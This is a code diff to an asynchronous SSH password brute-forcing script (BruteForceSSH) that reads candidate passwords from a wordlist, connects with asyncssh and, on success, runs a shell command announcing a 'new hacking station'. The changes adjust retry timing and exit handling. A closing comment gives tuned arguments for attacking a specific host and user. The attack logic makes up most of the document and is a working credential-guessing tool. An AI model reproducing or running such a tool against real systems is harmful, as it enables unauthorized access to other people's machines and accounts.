@@ -15,8 +15,6 @@ start: float = 0
 
 clone: dict[str, int] = {}
 
-
-@atexit.register
 def goodbye():
     with open("debug/statistic.txt", "w") as f:
         pprint(clone, f)
@@ -42,7 +40,7 @@ def goodbye():
         {reset}
         """
         print(s)
-    print("\n\nGoodbye!\n\n")
+    print("Goodbye!\n")
 
 class BruteForceSSH:
     uvloop.install()
@@ -100,6 +98,7 @@ class BruteForceSSH:
             print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.not_checked}", reset)
     
     def run(self):
+        atexit.register(goodbye)
         if self.max_workers:
             asyncio.run(self.main_thread_pool())
         else:
@@ -124,6 +123,7 @@ class BruteForceSSH:
     async def brute(self, password: str, nostop: bool = False ,command: str = '\nls -la ; echo "\nHello from ur new hacking station :)\n"'):
         i = 0
         while nostop or i <= self.max_retries:
+            await asyncio.sleep(random() * self.asleep)
             try:
                 async with asyncssh.connect(self.host, username=self.user, password=password, port=self.port, known_hosts=None, keepalive_interval=100) as conn:
                     success = await conn.run(command)
@@ -152,7 +152,6 @@ class BruteForceSSH:
                 if i == 0:
                     self.lost_attempt.add(password)
                     self.not_checked += 1
-            await asyncio.sleep(random() * self.asleep)
             clone[password] = clone.get(password, 0) + 1
             i += 1
         return 
@@ -269,3 +268,6 @@ if __name__ == '__main__':
     res = asyncio.run(b.run())
     
     print(time.perf_counter() - start)
+
+# MOST PERFORMANT ARGS
+# python3 brute.py -u fede -w ../wordlist/passwords_copy.csv -a 192.168.0.212 -p 4242 -m 1 --sem 100 -v
